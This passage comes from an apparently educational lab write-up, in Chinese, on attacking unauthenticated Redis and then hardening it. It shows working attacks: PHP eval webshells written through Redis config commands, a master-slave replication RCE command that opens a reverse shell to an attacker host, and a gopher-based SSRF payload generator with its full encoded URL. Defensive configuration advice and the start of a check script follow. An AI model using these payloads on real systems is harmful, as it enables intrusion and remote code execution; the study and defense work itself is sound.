class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">config set dbfilename shell.php </span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511040545099.png" alt="image-20240511040545099"></p><p><strong>蚁剑成功连接</strong></p><p><img src="/img/course/image-20240511040152924.png" alt="image-20240511040152924"></p><h3 id="（4）利用Redis主从复制GetShell"><a href="#（4）利用Redis主从复制GetShell" class="headerlink" title="（4）利用Redis主从复制GetShell"></a>（4）利用Redis主从复制GetShell</h3><p>Redis服务器存在一些大型网站采用的漏洞,例如如果使用了一台Redis服务器,且该服务器存在漏洞,攻击者可以远程执行命令导致数据泄露或损坏。图中还提到,Redis服务器集群可以很好地解决该问题,例如主从服务器复制,即使主服务器被攻击,也可以从从服务器进行数据管理和恢复。</p><p>Redis主从复制(Redis Replication)是一种数据复制技术,通过在多台服务器实例之间自动进行数据同步,来实现数据冗余备份、故障恢复以及负载均衡等功能。其基本原理是使用一个主(master)服务器实例和多个从(slave)服务器实例,实现数据的单向复制。主服务器负责数据的写入和读取操作,而从服务器则只负责通过复制主服务器中的数据来实现数据备份,从而达到数据冗余和异地容灾的目的。一旦主服务器出现故障,可以手动或自动进行主从服务器切换,将某一从服务器升级为新的主服务器,从而确保数据服务的可用性。</p><p>因为漏洞存在于4.x、5.x版本中，Redis提供了主从模式。<br>故靶机更换为 centos 192.168.198.147   redis-4.0.8</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">./redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.147</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">6379</span> -<span class="hljs-selector-tag">a</span> foobared<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 redis-rce.py -r 192.168.198.147 -L 192.168.198.134 -f exp.so -a foobared<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">python3 redis-rce.py -r rhost -lhost lhost -f exp.so -a password</span><br></code></pre></td></tr></table></figure><p>选择<code>r</code>来获得一个反弹shell</p><p><img src="/img/course/image-20240511172423214.png" alt="image-20240511172423214"></p><p>成功反弹shell，反弹shell很容易导致Redis暴毙</p><p><img src="/img/course/image-20240511173054864.png" alt="image-20240511173054864"></p><h3 id="（5）结合-SSRF-进行利用"><a href="#（5）结合-SSRF-进行利用" class="headerlink" title="（5）结合 SSRF 进行利用"></a>（5）结合 SSRF 进行利用</h3><p>SSRF 攻击的目标是从外网无法访问的内部系统，这里通过 SSRF 使用 dict 协议访问本地 Redis</p><p>构造 Redis 命令写入 webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">set 1 &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>\[\\<span class="hljs-string">&quot;f4ke\\&quot;</span>\]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename 5he1l.php</span><br><span class="language-xml">save</span><br><span class="language-xml">quit</span><br></code></pre></td></tr></table></figure><p>根据 RESP 协议使用python 脚本<code>redisSsrf.py</code>，将上述命令转换为 gopher payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>protocol = <span class="hljs-string">&quot;gopher://&quot;</span><br>ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-string">&quot;6379&quot;</span><br>shell = <span class="hljs-string">&quot;\\n\\n&lt;?php eval($_POST\[\\&quot;</span>f4ke\\<span class="hljs-string">&quot;\]);?&gt;\\n\\n&quot;</span><br>filename = <span class="hljs-string">&quot;5he1l.php&quot;</span><br>path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd = <span class="hljs-string">&quot;&quot;</span><br>cmd = [<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),  <br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span>,<br>     <span class="hljs-string">&quot;quit&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload = protocol + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF = <span class="hljs-string">&quot;\\r\\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.quote(redis_format(x))<br><br>    <span class="hljs-comment"># print(payload)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://192.168.198.147/ssrf.php?url=&quot;</span>+urllib.parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成 payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.198.147</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A6379/_%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aflushall%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A3%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25241</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252433</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">253</span>C%<span class="hljs-number">253</span>Fphp%<span class="hljs-number">2520</span>eval%<span class="hljs-number">2528</span>%<span class="hljs-number">2524</span>_POST%<span class="hljs-number">255</span>B%<span class="hljs-number">2522</span>f4ke%<span class="hljs-number">2522</span>%<span class="hljs-number">255</span>D%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">253</span>F%<span class="hljs-number">253</span>E%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252413</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A/var/www/html%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25249</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A5he1l.php%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aquit%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure><p>使用curl 访问构造好的 url ， 成功执行 Redis 命令写入 webshell</p><p><img src="/img/course/image-20240512212439121.png" alt="image-20240512212439121"></p><p>使用蚁剑尝试连接，连接成功</p><p><img src="/img/course/image-20240512212826275.png" alt="image-20240512212826275"></p><p>为了修复Redis未授权访问漏洞，可以采取以下措施：</p><ol><li><strong>设置密码认证</strong>：在Redis配置文件中启用<code>requirepass</code>选项，并设置一个强密码。</li><li><strong>限制访问</strong>：修改<code>bind</code>配置，只允许信任的IP地址访问Redis服务。</li><li><strong>使用安全通信</strong>：通过SSL&#x2F;TLS加密Redis客户端和服务器之间的通信。</li><li><strong>监控和日志记录</strong>：开启Redis的日志记录功能，监控可疑的访问和操作。</li><li><strong>及时更新</strong>：保持Redis版本更新，以修复已知的安全漏洞。</li></ol><h1 id="Redis-安全防护策略"><a href="#Redis-安全防护策略" class="headerlink" title="Redis 安全防护策略"></a>Redis 安全防护策略</h1><h2 id="1-配置访问控制策略"><a href="#1-配置访问控制策略" class="headerlink" title="1.配置访问控制策略"></a>1.配置访问控制策略</h2><h3 id="禁止监听在公网地址"><a href="#禁止监听在公网地址" class="headerlink" title="禁止监听在公网地址"></a>禁止监听在公网地址</h3><p>修改 Redis 监听端口，在配置文件 redis.conf 中进行设置，找到包含 bind 的行，将默认的<code>bind 0.0.0.0</code>改为<code>bind 127.0.0.1</code>或者内网 IP网段，重启 Redis以使配置生效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">bind</span> 192.168.1.100 10.0.0.1</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure><h3 id="使用防火墙"><a href="#使用防火墙" class="headerlink" title="使用防火墙"></a>使用防火墙</h3><p>在服务器上配置防火墙，仅允许特定规则的Redis连接请求通过。阻止其他不必要的连接请求，降低安全风险。</p><h2 id="2-修改默认配置"><a href="#2-修改默认配置" class="headerlink" title="2.修改默认配置"></a>2.修改默认配置</h2><h3 id="更改默认端口"><a href="#更改默认端口" class="headerlink" title="更改默认端口"></a>更改默认端口</h3><p>Redis 默认监听的端口为 6379，可以将配置文件的port项修改为其他非常用端口以隐藏服务</p><h3 id="开启-Redis-安全认证并设置复杂的密码"><a href="#开启-Redis-安全认证并设置复杂的密码" class="headerlink" title="开启 Redis 安全认证并设置复杂的密码"></a>开启 Redis 安全认证并设置复杂的密码</h3><p>Redis默认配置是无密码的，故容易导致Redis的未授权访问。在 redis.conf 配置文件中，修改 requirepass 选项开启密码认证并设置强密码。</p><h3 id="开启保护模式"><a href="#开启保护模式" class="headerlink" title="开启保护模式"></a>开启保护模式</h3><p>Redis在3.2版本新增了安全配置项protected-mode，开启后要求需要配置bind项并设置访问密码，关闭后允许远程连接。在 redis.conf 配置文件中，修改 protected-mode yes 选项开启保护模式，只允许有授权的主机远程访问。</p><h2 id="3-禁止使用-Root-权限启动"><a href="#3-禁止使用-Root-权限启动" class="headerlink" title="3.禁止使用 Root 权限启动"></a>3.禁止使用 Root 权限启动</h2><h3 id="创建单独的用户用于启动redis"><a href="#创建单独的用户用于启动redis" class="headerlink" title="创建单独的用户用于启动redis"></a>创建单独的用户用于启动redis</h3><p>使用root权限启动redis有较多风险。可以创建的一个Redis用户只用于运行 Redis 服务，而无法登录。同时redis用户没有其他目录与文件的访问权限，在未授权访问发生时，攻击者也难以通过Redis入侵服务器上的其他服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd -s /sbin/nolog -M redis <br>sudo -u redis redis-server /&lt;filepath&gt;/redis.conf <br></code></pre></td></tr></table></figure><h3 id="设置文件的访问权限"><a href="#设置文件的访问权限" class="headerlink" title="设置文件的访问权限"></a>设置文件的访问权限</h3><p>Redis 密码可明文存储在配置文件中，因此需要禁止非相关用对于配置文件的访问，设置 Redis 配置文件权限为 600，只有文件所有者拥有读和写权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 /&lt;filepath&gt;/redis.conf<br></code></pre></td></tr></table></figure><h2 id="4-监控和日志分析"><a href="#4-监控和日志分析" class="headerlink" title="4.监控和日志分析"></a>4.监控和日志分析</h2><p>定期检查Redis的访问日志，分析异常行为，及时发现和响应安全威胁。在配置文件logfile项指定日志文件保存位置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">logfile &quot;/var/log/redis.log&quot;<br></code></pre></td></tr></table></figure><h2 id="5-及时更新版本"><a href="#5-及时更新版本" class="headerlink" title="5.及时更新版本"></a>5.及时更新版本</h2><p>检查Redis版本，及时应用安全补丁和更新，以修复已知的安全漏洞。</p><p>通过上述措施，可以有效地减少Redis未授权访问漏洞的风险，保护服务器和数据的安全。</p><h1 id="防御策略验证实验"><a href="#防御策略验证实验" class="headerlink" title="防御策略验证实验"></a>防御策略验证实验</h1><p>以下通过脚本（具体代码参见附录）对redis安全性进行检查：</p><p>运行脚本，可以发现，未经安全配置的redis无法通过大多数安全检查</p><p><img src="/img/course/image-20240517233702181.png" alt="image-20240517233702181"></p><h2 id="配置防御策略"><a href="#配置防御策略" class="headerlink" title="配置防御策略"></a>配置防御策略</h2><p>1.创建单独用户用于启动redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建的 Redis 用户只能用于运行 Redis 服务，而无法登录</span><br>useradd -s /sbin/nologin -m redis  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">以redis用户启动redis</span><br>sudo -u redis nohup ./bin/redis-server ./redis.conf &amp;<br></code></pre></td></tr></table></figure><p>2.修改配置文件，设置强密码，开启protected-mode，禁止或者重命名一些高危命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑redis配置文件</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置强密码</span><br>requirepass strong_password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开启保护模式</span><br>protected-mode yes<br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 禁用高危命令：</span><br>rename-command FLUSHALL &quot;&quot;<br>rename-command CONFIG &quot;&quot;<br>rename-command EVAL &quot;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改高危命令的名称：</span><br>rename-command FLUSHALL &quot;shuaxin&quot;<br>rename-command CONFIG &quot;peizhi&quot;<br>rename-command EVAL &quot;zhixing&quot;<br></code></pre></td></tr></table></figure><p>3.配置访问控制，仅允许本地连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">允许局域网连接</span><br>bind 192.168.168.*<br><span class="hljs-meta prompt_"># </span><span class="language-bash">仅允许本地连接</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure><p>安全性验证</p><p>使用脚本进行安全检查：</p><p>由于使用了强密码，且配置了访问控制，故脚本连接时无法连接到redis。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240517154647351.png" alt="image-20240517154647351"></p><p>为了模拟密码泄露的情况，这里允许远程连接，password参数输入密码继续进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379  --password strong@pwd<br></code></pre></td></tr></table></figure><p><img src="/img/course/Inkedimage-20240517163331848.jpg" alt="Inkedimage-20240517163331848"></p><p>成功通过所有安全检查</p><h2 id="Redis安全安装与配置"><a href="#Redis安全安装与配置" class="headerlink" title="Redis安全安装与配置"></a>Redis安全安装与配置</h2><p>根据Redis安全防护策略，编写自动化shell脚本安装Redis（具体代码参见附录）</p><p>优点：</p><p>1.设置密码，并检查密码强度</p><p>2.默认开启访问控制策略，仅允许本地连接</p><p>3.systemctl配置管理，便于维护与检查</p><p>4.快速的自动化安装</p><p>一键安装</p><p><img src="/img/course/image-20240518011538733.png" alt="image-20240518011538733"></p><p><img src="/img/course/image-20240518011655104.png" alt="image-20240518011655104"></p><p>通过安全检测（由于访问控制策略，攻击主机无法连接）</p><p><img src="/img/course/image-20240518012412512.png" alt="image-20240518012412512"></p><p><img src="/img/course/image-20240518012247382.png" alt="image-20240518012247382"></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="安全性检测脚本"><a href="#安全性检测脚本" class="headerlink" title="安全性检测脚本"></a>安全性检测脚本</h2><p>check_redis_security.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> subprocess<br><br>exp_file = <span class="hljs-string">&quot;/home/kali/workfeild/exp.so&quot;</span>  <span class="hljs-comment"># 恶意模块路径</span><br>lhost = <span class="hljs-string">&quot;192.168.198.134&quot;</span>  <span class="hljs-comment"># 恶意服务器地址</span><br>password_file = <span class="hljs-string">&quot;/home/kali/password/top1000.txt&quot;</span>  <span class="hljs-comment"># 密码字典文件路径</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connection</span>(<span class="hljs-params">host, port, password</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    尝试连接到Redis服务器，如果连接成功返回True，否则返回False。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        client.ping()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.AuthenticationError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] Redis服务器需要身份验证&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_passwords</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从 Hydra 输出文件中提取密码。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    passwords = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;password:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                password = line.split(<span class="hljs-string">&quot;password:&quot;</span>)[<span class="hljs-number">1</span>].strip()<br>                passwords.append(password)<br>    <span class="hljs-keyword">return</span> 